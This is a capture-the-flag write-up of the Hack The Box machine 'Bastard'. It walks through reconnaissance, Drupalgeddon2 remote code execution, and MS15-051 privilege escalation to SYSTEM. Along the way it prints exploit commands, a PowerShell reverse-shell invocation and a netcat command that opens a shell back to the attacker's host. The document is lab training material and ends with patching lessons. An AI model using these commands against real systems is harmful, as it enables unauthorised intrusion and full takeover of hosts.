# HTB Write-up: Bastard

**Difficulty:** Medium
**OS:** Windows
**Target IP:** 10.129.57.224
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning
Started with a fast port sweep using `rustscan`, followed by a detailed service scan with `nmap`.

```bash
rustscan -a 10.129.57.224
```

```
Open 10.129.57.224:80
Open 10.129.57.224:135
Open 10.129.57.224:49154
```

```bash
nmap -sCV -T4 -p80,135,49154 10.129.57.224 -oA nmap/nmap
```

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| ...
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Key takeaways:
- **Drupal 7** on **IIS 7.5 / Windows** — an old-school Windows LAMP-alternative stack.
- `robots.txt` conveniently listed `CHANGELOG.txt`, a reliable way to pin the exact Drupal version.
- Standard Windows RPC ports open (135/49154), nothing directly actionable there at this stage.

---

## 2. Web Enumeration

### 2.1 Version Fingerprinting

```bash
curl http://10.129.57.224/CHANGELOG.txt
```

```
Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to define theme engines (API addition: ...)
- ...
```

Confirmed **Drupal 7.54** — a version affected by **CVE-2018-7600**, widely known as **Drupalgeddon2**: an unauthenticated remote code execution vulnerability in Drupal core's Form API, caused by insufficient sanitization of render arrays that allows attacker-controlled PHP callbacks to be injected via crafted `#markup`/`#access` properties in form submissions.

---

## 3. Exploitation — Foothold

### 3.1 Drupalgeddon2 (CVE-2018-7600)

Used a Drupalgeddon2 exploit script (previously developed/tested as part of a group project) to confirm RCE:

```bash
python3 exploit.py http://10.129.57.224/ whoami
```

```
[*] Targeting: http://10.129.57.224
[*] Got Build ID: form-Rj1d3tYsD9CI4euGExLT-BAVH3qC1BFV-VuDyySslOI
[*] Executing command: whoami

--- Command Output ---
nt authority\iusr
----------------------
```

Confirmed unauthenticated command execution as the IIS application pool identity, `nt authority\iusr`.

### 3.2 Reverse Shell

Passed a Base64-encoded PowerShell TCP reverse-shell payload through the same exploit to get an interactive callback:

```bash
python3 exploit.py http://10.129.57.224/ 'powershell%20-e%20<base64-encoded-payload>'
```

Caught the connection on a listener:

```bash
rlwrap nc -lvnp 4444
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.57.224] 49211
whoami
nt authority\iusr
```

✅ Foothold obtained as `nt authority\iusr`.

### 3.3 Host Enumeration

```powershell
systeminfo
```

```
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
...
Domain:                    HTB
Hotfix(s):                 N/A
```

**No hotfixes installed at all** (`Hotfix(s): N/A`) on a Windows Server 2008 R2 build from 2017 — a strong signal the box is vulnerable to well-known, unpatched local kernel exploits.

---

## 4. Privilege Escalation

### 4.1 Selecting an Exploit

Given the fully unpatched OS build, targeted **MS15-051** (CVE-2015-1701) — a Windows kernel privilege escalation vulnerability in `win32k.sys` that allows a low-privileged process to escalate to `NT AUTHORITY\SYSTEM`.

```bash
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip
```

### 4.2 Delivering the Exploit

Rather than uploading the binary directly, stood up an SMB share on Kali to serve it (and a Netcat binary) straight from the attacking host:

```bash
sudo impacket-smbserver myshare `pwd` -smb2
```

### 4.3 Confirming the Exploit

```powershell
\\10.10.15.146\myshare\ms15-051x64.exe "whoami"
```

```
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1744 created.
==============================
nt authority\system
```

Confirmed the exploit successfully spawns processes as SYSTEM.

### 4.4 Interactive SYSTEM Shell

Used the same exploit to launch a SYSTEM-context reverse shell back to a second listener:

```powershell
\\10.10.15.146\myshare\ms15-051x64.exe "C:\Windows\System32\cmd.exe /c \\10.10.15.146\myshare\nc64.exe -e cmd.exe 10.10.15.146 443"
```

```bash
rlwrap nc -lvnp 443
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.57.236] 49170
Microsoft Windows [Version 6.1.7600]

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```

✅ SYSTEM access obtained.

---

## 5. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → IIS 7.5 hosting Drupal 7 on Windows Server 2008 R2 |
| Version fingerprinting | `CHANGELOG.txt` confirmed Drupal 7.54, vulnerable to Drupalgeddon2 |
| Foothold | CVE-2018-7600 (Drupalgeddon2) unauthenticated RCE → shell as `nt authority\iusr` |
| Host enumeration | `systeminfo` revealed zero hotfixes installed |
| Privilege Escalation | MS15-051 (CVE-2015-1701) unpatched kernel exploit, delivered via an Impacket SMB share → SYSTEM |

**Root cause / lessons learned:**
- Running an outdated, unpatched CMS (Drupal 7.54) with a well-documented, unauthenticated RCE (Drupalgeddon2) gave an immediate foothold with no credentials required. Drupal core and contributed modules need a defined patching cadence, especially for security releases.
- Serving payloads over an attacker-controlled SMB share (`impacket-smbserver`) avoided needing an upload primitive on the target and kept the tooling off disk until execution — worth remembering as a general technique for constrained footholds.
- The complete absence of hotfixes on a multi-year-old Windows Server build meant a five-year-old public kernel exploit (MS15-051) worked without modification. Regular OS patching would have closed this path entirely, and even without patching, running the IIS worker process with reduced local privileges would have limited the blast radius of the initial RCE.

---

## 6. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `curl` — version fingerprinting via `CHANGELOG.txt`
- Drupalgeddon2 (CVE-2018-7600) exploit script — unauthenticated RCE
- PowerShell reverse shell (Base64-encoded `-e` payload) — interactive foothold
- `impacket-smbserver` — payload delivery
- MS15-051 (CVE-2015-1701) kernel exploit — privilege escalation
- Netcat (`rlwrap nc`) — shell handling
